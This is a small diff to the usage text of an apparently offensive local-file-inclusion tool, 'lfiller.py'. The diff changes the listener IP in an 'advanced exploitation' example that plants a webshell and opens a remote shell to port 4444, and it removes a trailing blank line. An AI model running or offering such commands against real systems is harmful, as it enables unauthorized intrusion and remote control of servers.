@@ -1032,7 +1032,7 @@ BASIC AUDIT (Safe for Bounty):
   python3 lfiller.py -u "http://target.com/page.php?file=" -C "PHPSESSID=..."
 
 ADVANCED EXPLOITATION (WebShell + RCE + Headers):
-  python3 lfiller.py -u "http://target.com/page.php?file="  -C "PHPSESSID=val" -H "Authorization: Bearer X"  --webshell --rce -lh 192.168.1.2 -lp 4444
+  python3 lfiller.py -u "http://target.com/page.php?file=" -C "PHPSESSID=val" -H "Authorization: Bearer X" --webshell --rce -lh 10.10.10.10 -lp 4444
 
 ╔══════════════════════════════════════════════════════════╗
 ║                 ⚠️  DANGER ZONE (--rce)  ⚠️              ║
@@ -1085,4 +1085,3 @@ USE WITH CAUTION.
 
 if __name__ == "__main__":
     main()
-
